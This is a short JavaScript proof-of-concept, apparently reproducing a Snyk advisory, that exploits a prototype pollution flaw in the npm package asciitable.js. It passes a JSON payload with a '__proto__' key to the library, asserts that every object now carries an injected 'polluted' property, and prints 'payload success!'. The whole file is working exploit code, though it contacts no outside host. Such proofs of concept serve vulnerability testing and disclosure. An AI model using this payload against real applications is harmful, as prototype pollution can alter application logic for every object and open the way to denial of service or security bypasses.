//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799

const { assert } = require("@firebase/util");
var req = require("asciitable.js");

var obj ={}
console.log("Before : " + obj.polluted);
var b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
req({},b);
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");